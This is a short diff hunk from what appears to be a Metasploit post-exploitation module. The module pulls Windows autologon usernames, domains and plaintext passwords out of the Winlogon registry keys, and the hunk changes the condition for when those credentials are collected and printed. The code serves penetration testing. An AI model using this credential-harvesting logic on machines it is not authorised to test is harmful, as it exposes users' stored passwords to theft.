@@ -56,13 +56,13 @@ class MetasploitModule < Msf::Post
     du2 = registry_getvaldata(logon_key, "AltDefaultUserName")   || ''
     dp2 = registry_getvaldata(logon_key, "AltDefaultPassword")   || ''
 
-    if do1 != '' && du1 != '' && dp1 == ''
+    if do1 != '' && du1 != '' && (dp1 != '' || (dp1 == '' && al == '1'))
       has_al = 1
       creds << [du1, dp1, do1]
       print_good("AutoAdminLogon=#{al}, DefaultDomain=#{do1}, DefaultUser=#{du1}, DefaultPassword=#{dp1}")
     end
 
-    if do2 != '' && du2 != '' && dp2 == ''
+    if do2 != '' && du2 != '' && (dp2 != '' || (dp2 == '' && al == '1'))
       has_al = 1
       creds << [du2, dp2, do2]
       print_good("AutoAdminLogon=#{al}, AltDomain=#{do2}, AltUser=#{du2}, AltPassword=#{dp2}")
